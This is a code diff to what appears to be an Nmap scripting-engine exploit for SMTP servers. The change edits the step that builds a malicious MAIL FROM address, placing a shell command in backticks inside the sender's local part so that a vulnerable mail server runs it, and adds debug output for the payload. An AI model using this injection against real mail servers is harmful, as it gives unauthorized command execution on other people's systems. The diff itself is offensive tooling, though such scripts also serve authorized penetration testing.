@@ -18,6 +18,7 @@ categories = {"exploit"}
 local smtp = require "smtp"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
+local string = require "string"
 
 portrule = shortport.port_or_service({25, 465, 587},
                 {"smtp", "smtps", "submission"})
@@ -64,8 +65,10 @@ action = function(host, port)
   end
 
   --Sends MAIL cmd and injects malicious payload
-  local from_frags = string.split(from, "@")
+  local from_frags =  stdnse.strsplit("@", from)
+  print(from_frags[2])
   local malicious_from_field = from_frags[1].."`"..cmd.."`@"..from_frags[2]
+  stdnse.print_debug(1, "%s:Setting malicious MAIL FROM field to:%s", SCRIPT_NAME, malicious_from_field)
   status, resp = smtp.mail(smtp_conn, malicious_from_field)
   if not(status) then
     stdnse.print_debug(1, "%s:Payload failed:%s", SCRIPT_NAME, resp)
